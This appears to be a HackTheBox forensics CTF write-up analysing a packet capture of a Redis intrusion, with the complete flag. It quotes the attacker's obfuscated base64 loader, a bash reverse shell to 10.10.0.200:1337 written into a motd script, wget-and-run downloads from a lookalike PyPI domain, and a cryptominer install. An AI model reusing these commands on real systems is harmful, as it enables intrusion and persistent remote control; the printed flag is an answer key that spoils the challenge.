---
layout: post
title: "RedTrails"
date: 2026-07-08
categories: [Forensics]
difficulty: Medium
platform: HackTheBox
tags: []
excerpt: "Analyzing a multi-stage attack through Redis exploitation, reverse shell deployment and AES-256-CBC decryption."
---
## Analysis

We are provided with a packet capture file:

```bash
$ file capture.pcap
capture.pcap: pcapng capture file
```

Opening the file in Wireshark and filtering for RESP (Redis Serialization Protocol) traffic reveals malicious Redis activity.

There are only a few packets, so we can follow the TCP stream and see what we have.

## Flag Part 2

Following TCP Stream 0 reveals Redis commands showing a user table. The attacker appears to have gained access to a Redis instance and is performing reconnaissance.

Within the Redis command responses, I found a flag fragment:

```bash
FLAG_PART: _c0uld_0p3n_n3w
```

Further down the stream, I spotted the attacker downloading and executing a malicious script:

```bash
wget -O VgLy8V0Zxo 'http://files.pypi-install.com/packages/VgLy8V0Zxo' && bash VgLy8V0Zx
```

`Flag Part 2: _c0uld_0p3n_n3w`

## Flag Part 1

Moving to TCP Stream 1, I encountered a heavily obfuscated Bash script. To decrypt it, I reversed the text and decoded it using Base64.

![flag1]({{ '/assets/img/htb/redtrail1.png' | relative_url }})

The script was split across multiple variables that were concatenated into another Base64-encoded string:

```bash
lhJVXukWibAFfkv() {
    ABvnz='ZWNobyAnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3R'
    QOPjH='jcP8xMC4xMC4wLjIwMC8xMzM3IDA+JjEiJyA+IC9'
    gQIxX='ldGMvdXBkYXRlLW1vdGQuZC8wMC1oZWFkZXIK'
    echo "$ABvnz$QOPjH$gQIxX" | base64 --decode | bash
}
```

I decoded the Base64 string:

```bash
echo "ZWNobyAnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4wLjIwMC8xMzM3IDA+JjEiJyA+IC9ldGMvdXBkYXRlLW1vdGQuZC8wMC1oZWFkZXIK" | base64 -d
```

This revealed:

```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.0.200/1337 0>&1"' > /etc/update-motd.d/00-header
```

The attacker was establishing a reverse shell to `10.10.0.200:1337`.

Decoding the second function revealed an SSH key being added to `~/.ssh/authorized_keys` for persistence, along with another flag fragment.

`Flag Part 1: HTB{r3d15_1n574nc35`

## Flag Part 3

TCP Stream 2 revealed the complete Redis exploitation sequence:

```text
Authentication

Setting Up Replication

Configuring Malicious Module

Loading the Module

Restoring Redis

Executing Commands
```

The attacker executed several commands using `system.exec`:

```text
system.exec rm -v ./x10SPFHN.so
system.exec uname -a
system.exec wget --no-check-certificate -O gezsdSC8i3 'https://files.pypi-install.com/packages/gezsdSC8i3' && bash gezsdSC8i3
```

The outputs of these commands were encrypted, appearing as long hex strings. The final encrypted output was:

```text
394810bbd00d01baa64e1da65ad18dcbe7d1ca585d429847e0fe1c4f76ff3cf49fcc4943e9dd339c5cbac2fd876c21d37b4ea3c014fe679f81cd9a546a7a324c6958b87785237671b3331ae9a54d126f78c916de74c154a1915a963edffdb357af5d7cfdb85b200fdeb35f4f508367081e31e3094c15e2a683865bb05b04a36b19202ab49c5ebffcec7698d5f2e344c5d9da608c5c2506c689c1fc4a492bec4dd4db33becb17d631c0fdd7e642c20ffa7e987d2851c532e77bdfb094c0cfcd228499c57ea257f305c367b813bc4d4cf937136e02398ce7cb3c26f16f3c6fc22a2b43795d41260b46d8bdf0432aaefbcc863880571952510bf3d98919219ab49e86974f11a81fff5ff85734601e79c2c2d754e3fe7a6cfcec8349ceb350ea7145f87b86f7e65543268c8ae76cb54bef1885b01b222841da59a377140ae6bd544cc47ac550a865af84f5b31df6a21e7816ed163260f47ea16a64f153be1399911a99fd71b30689b961477db551c9bc2cdc1aa6b931ba2852af1e297ee66fb99381ab916b377358243152f1f3abba9f7ad700ba873b53dc2f98642f47580d7ef5d3e3b32b3c4a9a53689c68a5911a6258f2da92ca30661ebef77109e1e44f3aa6665f6734af7d3d721201e3d31c61d4da562cef34f66dd7f88fb639b2aaf4444952
```

TCP Stream 6 contained the Redis replication data. After the `FULLRESYNC` command, Redis sent an `.rdb` file containing the malicious `x10SPFHN.so` module.

I looked through the stream and found the following:

```bash
AES Key: h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz

IV: YDP7ECjzuV7sagMN

Cipher: AES-256-CBC
```

The module was using OpenSSL's EVP functions to encrypt command outputs, which explained the encrypted hex strings in Stream 2. Now we can decrypt the data and probably find the final part of the flag.

Using the extracted key and IV, I wrote a Python script to decrypt the encrypted output from Stream 2:

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import binascii

# Encrypted output from Stream 2
ciphertext_hex = "394810bbd00d01baa64e1da65ad18dcbe7d1ca585d429847e0fe1c4f76ff3cf49fcc4943e9dd339c5cbac2fd876c21d37b4ea3c014fe679f81cd9a546a7a324c6958b87785237671b3331ae9a54d126f78c916de74c154a1915a963edffdb357af5d7cfdb85b200fdeb35f4f508367081e31e3094c15e2a683865bb05b04a36b19202ab49c5ebffcec7698d5f2e344c5d9da608c5c2506c689c1fc4a492bec4dd4db33becb17d631c0fdd7e642c20ffa7e987d2851c532e77bdfb094c0cfcd228499c57ea257f305c367b813bc4d4cf937136e02398ce7cb3c26f16f3c6fc22a2b43795d41260b46d8bdf0432aaefbcc863880571952510bf3d98919219ab49e86974f11a81fff5ff85734601e79c2c2d754e3fe7a6cfcec8349ceb350ea7145f87b86f7e65543268c8ae76cb54bef1885b01b222841da59a377140ae6bd544cc47ac550a865af84f5b31df6a21e7816ed163260f47ea16a64f153be1399911a99fd71b30689b961477db551c9bc2cdc1aa6b931ba2852af1e297ee66fb99381ab916b377358243152f1f3abba9f7ad700ba873b53dc2f98642f47580d7ef5d3e3b32b3c4a9a53689c68a5911a6258f2da92ca30661ebef77109e1e44f3aa6665f6734af7d3d721201e3d31c61d4da562cef34f66dd7f88fb639b2aaf4444952"

ciphertext = binascii.unhexlify(ciphertext_hex)

# Key and IV from the module
key = b"h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz"
iv = b"YDP7ECjzuV7sagMN"

# AES-256-CBC decryption
cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
decryptor = cipher.decryptor()
plaintext = decryptor.update(ciphertext) + decryptor.finalize()

# Remove PKCS#7 padding
padding_len = plaintext[-1]
plaintext = plaintext[:-padding_len]

print(plaintext.decode("utf-8"))
```

The decrypted output revealed:

```text
--- Installing ethminer ---
--- Enabling automatically startup ---
--- Setting env ---
FLAG_PART=_un3xp3c73d_7r41l5!}
--- Success! ---
```

`Flag Part 3: _un3xp3c73d_7r41l5!}`

## Flag

`HTB{r3d15_1n574nc35_c0uld_0p3n_n3w_un3xp3c73d_7r41l5!}`
